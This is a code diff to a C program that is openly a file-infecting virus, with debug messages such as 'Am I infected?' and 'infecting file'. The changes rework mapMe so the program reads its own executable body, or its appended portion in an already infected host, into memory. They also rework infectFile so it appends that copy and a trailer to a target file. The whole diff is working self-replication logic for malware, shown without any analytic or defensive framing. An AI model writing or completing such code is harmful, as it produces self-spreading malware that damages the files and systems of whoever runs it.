@@ -4,6 +4,7 @@
 #include <stdlib.h>
 
 #include "log.h"
+#include "utils.h"
 
 #pragma pack(push)  /* push current alignment to stack */
 #pragma pack(1)     /* set alignment to 1 byte boundary */
@@ -82,30 +83,50 @@ static int appendBuf2Fp(char *buf, size_t siz, FILE *fp, long int *myOffset)
     return (ERR_OK);
 }
 
-static int mapMe(char *argv0, char **dstPtr)
+static int mapMe(char *argv0, char **dstPtr, size_t *dstPtrLen)
 {
     FILE *fp;
     trailer_t *trl;
-    char *buf;
+    char *buf = NULL;
+    long int siz, myStart = 0, mySiz = 0;
 
-    // do _NOT_ use mmap here!
     fp = fopen(argv0, "rb");
     if (!fp) return (ERR_FAIL);
+    if (fseek(fp, 0L, SEEK_END) != 0) goto fail;
+    siz = ftell(fp);
     D2("Am I infected?")
     if ((trl = getTrailer(fp)) != NULL)
     {
         D2("im already infected")
+        myStart = siz - sizeof(trailer_t) - trl->mySize;
+        mySiz = trl->mySize;
     }
     else
     {
+        mySiz = siz;
+        myStart = 0;
     }
+    if (fseek(fp, myStart, SEEK_SET) != 0) goto fail;
+    buf = calloc(1, mySiz);
+    if (fread(buf, 1, mySiz, fp) < mySiz) goto fail;
+    *dstPtrLen = mySiz;
+    *dstPtr = buf;
+    fclose(fp);
     return (ERR_OK);
+fail:
+    E("copying myself into the memory failed (start: %ld |size: %ld)", myStart, mySiz);
+    if (buf != NULL) free(buf);
+    *dstPtrLen = 0;
+    *dstPtr = NULL;
+    fclose(fp);
+    return (ERR_FAIL);
 }
 
-int infectFile(char *argv0, size_t siz, char *target)
+int infectFile(char *argv0, char *target)
 {
     FILE *fp;
-    char *buf;
+    char *buf = NULL;
+    size_t siz = 0;
     long int myOffset;
     trailer_t *trl;
 
@@ -120,9 +141,9 @@ int infectFile(char *argv0, size_t siz, char *target)
     }
     fp = fopen(target, "ab");
     if (!fp) return (ERR_FAIL);
-    mapMe(argv0, &buf);
+    mapMe(argv0, &buf, &siz);
     D("infecting file '%s'", target);
-    if (appendBuf2Fp(argv0, siz, fp, &myOffset) == ERR_OK)
+    if (appendBuf2Fp(buf, siz, fp, &myOffset) == ERR_OK)
     {
         if (appendTrailer(fp, myOffset, siz) == ERR_OK)
         {
